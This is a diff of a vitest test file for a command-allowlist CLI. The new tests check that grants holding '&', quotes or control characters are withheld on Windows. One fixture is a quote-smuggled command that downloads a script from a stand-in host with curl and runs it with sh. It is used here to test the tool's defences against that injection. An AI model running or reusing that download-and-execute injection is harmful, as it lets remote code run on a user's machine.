@@ -2,7 +2,7 @@ import { existsSync } from 'node:fs'
 import { join } from 'node:path'
 import { describe, expect, it } from 'vitest'
 import { cliAct } from '../src/act.js'
-import { ensureTrusted, grantCommands, sourced, trustListing } from '../src/allowlist.js'
+import { ensureTrusted, grantCommands, grantOf, grantRows, pendingCmds, pendingRows, sourced, trustListing, UNGRANTABLE } from '../src/allowlist.js'
 import { decideView } from '../src/decide-view.js'
 import { readStream } from '../src/journal.js'
 import { needsYou } from '../src/needs-you.js'
@@ -349,10 +349,13 @@ describe('the trust listing is a model (rows 139/203)', () => {
       { cmd: 'test -d .git', source: `need: n${shown}`, status: 'untrusted' },
     ])
     expect(controlStrings(one.value.rows)).toEqual([])
-    // R15: the target stays raw, in the listing and in the grants it offers, and nothing else does
+    // R15: the target stays raw in the listing's `target` and in each pending grant's `argv`, which
+    // runs with no shell. Ruling R27: the grant's printed `line` is now spelled (the id is not ASCII,
+    // so the grant is withheld and shown spelled), so no shown string holds a control or bidi
+    // character — only the raw `target` and the raw `argv` do.
     expect(one.value.target).toBe(id)
     expect(one.value.pending.at(-1)).toEqual(cliAct('trust', id, '--cmd', 'test -d .git'))
-    expect(controlStrings(one.value)).toEqual([id, ...one.value.pending.flatMap((a) => [a.argv[1], a.line])])
+    expect(controlStrings(one.value)).toEqual([id, ...one.value.pending.map((a) => a.argv[1])])
     // the inbox's trust grant, from the sources drive hands it
     const items = needsYou(repo.root, { env: {} }, cfg, canon, [
       { target: id, kind: 'kept', stop: 'trust-grant', trust: sourced(cfg, canon, id, ['echo first', 'test -d .git']) },
@@ -589,5 +592,65 @@ describe('a remedy for a command never granted names no grant (row 237)', () => 
     const full = await runFullSuite(repo.root, ctx, { mode: 'full-suite', reportGlob: 'r.xml', suiteCmd: 'bad\u001bcmd' })
     expect(full.ok).toBe(false)
     if (!full.ok) expect(full.violations[0]).toMatchObject({ rule: 'untrusted-blocked', want: NEVER })
+  })
+})
+
+// Row 239. A grant Windows withholds is never offered to be pasted, so its line names the listing,
+// which keeps the command pending and asks for it at a terminal.
+describe('a grant Windows withholds names the listing instead (row 239)', () => {
+  it("grantOf keeps today's answers, and names the listing for a withheld grant", () => {
+    expect(grantOf('p1', { cmd: 'npm test' }, 'win32')).toBe("witness trust p1 --cmd 'npm test'")
+    expect(grantOf('p1', { cmd: 'bad\u001bcmd' }, 'win32')).toBe(UNGRANTABLE)
+    expect(grantOf('p1', { cmd: 'npm test && npm run lint' }, 'darwin')).toBe("witness trust p1 --cmd 'npm test && npm run lint'")
+    expect(grantOf('p1', { cmd: 'npm test && npm run lint' }, 'win32')).toBe('not offered on Windows — it holds &, which ' +
+      'cmd.exe or Windows PowerShell can read as more than text · at a terminal, witness trust p1 asks for each command')
+  })
+
+  // Row 239 (B12). A kept stop names the repo's command on its own line, so the grant prints on a
+  // row of its own under it, never after text the repo wrote.
+  it('a grant prints on its own line; on Windows a risky one is withheld for the listing (row 239)', () => {
+    expect(grantRows('p1', { cmd: 'npm test' }, 'darwin')).toEqual(["  run: witness trust p1 --cmd 'npm test'"])
+    expect(grantRows('p1', { cmd: 'bad\u001bcmd' })).toEqual(['  note: never granted here — rewrite it in printable ASCII where it is written'])
+    expect(grantRows('p1', { cmd: 'npm test && npm run lint' }, 'win32')).toEqual([
+      '  note: not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read as more than text',
+      '  run: witness trust p1',
+    ])
+    // Ruling R16(b): the listing fallback honours withheld too — a target Windows withholds is never a `run:`
+    expect(grantRows('p1&x', { cmd: 'npm test' }, 'win32')).toEqual([
+      '  note: not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read as more than text',
+      "  note: witness trust 'p1&x' — not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read as more than text",
+    ])
+  })
+
+  // Ruling R22. PowerShell doubles a quote inside its quotes, and Git Bash, where the skills run the
+  // line, reads the doubled form as strings side by side: a grant of a command holding a quote would
+  // trust another command there (probed: `echo 'x; curl …; sh x.sh'` arrived as `echo x; curl …; sh
+  // x.sh`). On Windows it is withheld for the listing, as a risky one is; elsewhere it is offered.
+  it('on Windows a grant of a command holding a quote names the listing (row 239, ruling R22)', () => {
+    const cmd = "echo 'x; curl -o x.sh example.invalid/p; sh x.sh'"
+    expect(grantRows('p1', { cmd }, 'win32')).toEqual([
+      "  note: not offered on Windows — it holds ', which PowerShell and Git Bash read differently",
+      '  run: witness trust p1',
+    ])
+    expect(grantOf('p1', { cmd }, 'win32')).toBe("not offered on Windows — it holds ', which PowerShell and Git Bash read " +
+      'differently · at a terminal, witness trust p1 asks for each command')
+    expect(grantRows('p1', { cmd }, 'darwin')).toEqual(["  run: witness trust p1 --cmd 'echo '\\''x; curl -o x.sh example.invalid/p; sh x.sh'\\'''"])
+    expect(grantRows('p1', { cmd: 'vitest -t "it\'s"' }, 'win32')[0]).toBe("  note: not offered on Windows — it holds \", which " +
+      "cmd.exe or Windows PowerShell can read as more than text, and ', which PowerShell and Git Bash read differently")
+  })
+
+  // The listing the withheld grant names grants nothing by itself: the command must still be
+  // pending, or the terminal's per-command prompt would never ask for it.
+  it('a withheld command stays pending, so the terminal prompt still asks for it (Review Focus 1)', async () => {
+    const repo = await planWithCmdCriterion('npm test && npm run lint')
+    const r = trustListing(repo.root, cfgOf(repo.root), loadCanon(repo.root), 'ingest-plan-1', 'win32')
+    if (!r.ok) throw new Error('listing')
+    expect(pendingCmds(r.value)).toContain('npm test && npm run lint')
+    expect(pendingRows(r.value, 'win32')).toEqual([
+      'note: npm test && npm run lint — not offered on Windows — it holds &, which cmd.exe or Windows PowerShell can read ' +
+        'as more than text · at a terminal, witness trust ingest-plan-1 asks for each command',
+      "run: witness trust ingest-plan-1 --cmd 'pnpm lint'",
+      "run: witness trust ingest-plan-1 --cmd 'echo first'",
+    ])
   })
 })
